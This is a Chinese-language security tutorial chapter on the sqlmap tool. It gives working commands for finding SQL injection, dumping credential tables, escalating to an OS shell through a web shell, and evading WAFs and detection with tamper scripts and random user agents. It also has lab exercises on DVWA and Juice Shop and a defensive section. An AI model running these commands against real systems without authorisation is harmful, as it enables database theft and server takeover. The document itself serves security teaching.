# Ch 18 — sqlmap

> 目標：精通 sqlmap — SQL injection 自動化神器。

## sqlmap 是什麼

「**SQL Injection 探測 + 利用自動化**」。寫了 100+ technique 處理各種 DB / WAF / 場景。

```bash
sqlmap -u "http://target/page?id=1"
```

一條命令：

- 偵測 injection point
- 識別 DB 類型
- 跑各種 payload
- dump schema / data
- 升 OS shell

「**找到 vulnerable URL → sqlmap → done**」是現代 SQL injection workflow。

## 安裝

```bash
sudo apt install sqlmap
# 或
pip install sqlmap

# 確認
sqlmap --version
```

## 基本用法

### 1. 給 URL

```bash
sqlmap -u "http://target/page?id=1"
```

sqlmap 自動：

- 試 `id=1' OR 1=1--`、`id=1 AND SLEEP(5)`、各種 payload
- 確認 injection
- 識別 DB

### 2. 從 Burp request file

```bash
# 在 Burp: Right-click request → Copy to file
sqlmap -r request.txt
```

包含 cookies / headers / POST body — sqlmap 全用上。

對 logged-in / 複雜 request 必用這個。

### 3. POST data

```bash
sqlmap -u "http://target/login" --data="user=admin&pass=test"
```

### 4. Cookie

```bash
sqlmap -u "http://target/page" --cookie="session=abc123"
```

## 探索 DB

```bash
# DB 列表
sqlmap -r req.txt --dbs

# 某 DB 的 tables
sqlmap -r req.txt -D myapp --tables

# 某 table 的 columns
sqlmap -r req.txt -D myapp -T users --columns

# Dump 某 table
sqlmap -r req.txt -D myapp -T users --dump

# Dump 全部 (慢)
sqlmap -r req.txt --dump-all

# 只 dump 特定 column
sqlmap -r req.txt -D myapp -T users -C username,password --dump
```

## 進階

### 1. OS shell（如果 DB 支援）

```bash
sqlmap -r req.txt --os-shell
```

如果 DB 是 MySQL/MSSQL + 有 file write 權限 → 寫 web shell → 變 OS RCE。

### 2. SQL shell（互動）

```bash
sqlmap -r req.txt --sql-shell
sql-shell> SELECT @@version
```

直接打 SQL，不用每次重 sqlmap。

### 3. Specify injection technique

sqlmap 自動試所有 technique。手動指定：

```bash
sqlmap -r req.txt --technique=BEU
# B = Boolean
# E = Error
# U = Union
# T = Time
# S = Stacked queries
# Q = Inline queries
```

### 4. Specify DBMS

加速：

```bash
sqlmap -r req.txt --dbms=MySQL
```

### 5. WAF bypass: tampering

WAF 擋 raw payload？用 tamper script encode：

```bash
sqlmap -r req.txt --tamper=between,space2comment

# 列所有 tamper
sqlmap --list-tampers
```

常用：

- `between`：用 `BETWEEN` 替代 `=`
- `space2comment`：space 改 `/**/`
- `randomcase`：隨機大小寫
- `charunicodeencode`：unicode encode

組合用。

### 6. 控制 request 速度

```bash
sqlmap -r req.txt --delay=1 --threads=1   # 慢、單線程（避免被 WAF / lockout）
sqlmap -r req.txt --threads=10            # 快（也容易被擋）
```

### 7. risk + level

更激進 scan：

```bash
sqlmap -r req.txt --level=5 --risk=3
```

`level` 1-5（測試多少 payload variant）  
`risk` 1-3（會不會 destructive — 可能 DELETE / UPDATE）

`risk=3` 對 production **危險**！

## 完整 dump 範例

```bash
# 1. 用 Burp 抓 logged-in request 存 req.txt

# 2. 找 vulnerable parameter
sqlmap -r req.txt --dbs
# 確認 vulnerable + 列 DB

# 3. 探索
sqlmap -r req.txt -D mydb --tables
sqlmap -r req.txt -D mydb -T users --columns
sqlmap -r req.txt -D mydb -T users --dump

# 4. 升 OS shell（如果 DB 允許）
sqlmap -r req.txt --os-shell
```

## 一個常見踩雷：sqlmap 對 production 的影響

sqlmap 大量 request：

- 觸發 WAF / IPS
- 鎖 IP
- 跟 DB 跑 expensive query → DoS effect
- log 大量 entry

**只對 lab / 自己 server / 簽合約 client / bug bounty scope**。

## 一個常見踩雷：sqlmap 看不到 injection

可能：

- 不是 SQL injection（是別種）
- WAF 擋
- vulnerable 在不同 parameter
- 需要 cookie / auth

debug：

```bash
sqlmap -r req.txt -v 5    # max verbose
# 看 sqlmap 試了什麼 payload
```

或手動先確認（`'`、`"`、`' OR 1=1--` 看 response 變化）。

## 一個常見踩雷：dump 太慢

`--dump-all` 對大 DB 幾天跑不完（特別 blind injection）。

對策：

- 只 dump 你需要的（特定 table / column）
- `--threads=10`
- `--first=1 --last=100`（dump 前 100 row）
- 用 `--proxy=http://burp:8080` 中斷 / resume

## 一個常見踩雷：「sqlmap 沒找到 = 沒 injection」

**錯**。sqlmap 找不到不代表沒漏洞 — 可能：

- Stored procedure 內部 injection
- 二階 injection（store + later use）
- Out-of-band 才能偵測
- 需要特定 charset / encoding

**人腦 + 經驗**仍重要。sqlmap 是 starter。

## 防禦角度

知道 sqlmap 怎麼攻 = 知道怎麼防：

- prepared statements（Ch 6）
- WAF (CloudFlare / ModSecurity / nuclei + auth) — 最少擋常見
- monitoring：sqlmap user-agent 識別 (`sqlmap/1.x`)
- rate limit + WAF
- principle of least privilege（DB user 不該有 FILE / DROP 權限）

`sqlmap` user-agent 易識別 → 可改：

```bash
sqlmap -r req.txt --random-agent
```

但攻擊 pattern 仍可被 detect。

## 動手練習

**1. DVWA 完整 dump**

```bash
# DVWA SQL Injection (low / medium)
# 用 Burp 抓 request 含 cookie

sqlmap -r dvwa-req.txt --dbs
sqlmap -r dvwa-req.txt -D dvwa --tables
sqlmap -r dvwa-req.txt -D dvwa -T users --dump

# 看到 user/password hash dump 出來
```

**2. Juice Shop**

「Database Schema」challenge — 用 sqlmap 找 SQL injection point + dump schema。

**3. Boolean blind**

對只回 generic error 的 endpoint，sqlmap blind 模式：

```bash
sqlmap -r req.txt --technique=B
```

慢（每字元多次 request），但有效。

**4. WAF bypass 練習**

對自己 vulnerable app 加簡單 WAF rule（block `'`），用 tamper bypass：

```bash
sqlmap -r req.txt --tamper=charunicodeencode,space2comment
```

**5. OS shell 升級**

DVWA 高權限環境試 `--os-shell`。看 sqlmap 怎麼從 SQL injection 寫 web shell。

## 自我檢核

- [ ] sqlmap 基本命令熟（-u / -r / --dbs / --dump）
- [ ] 知道 6 種 technique（BEUTSQ）
- [ ] 用過 tamper script
- [ ] 對 DVWA 完成 dump 至少 1 次
- [ ] 知道 sqlmap 對 production 的危險
- [ ] 知道 sqlmap 限制（不是萬能）

下一章看其他常用工具。

→ [Ch 19 其他工具大全](./19-other-tools.md)
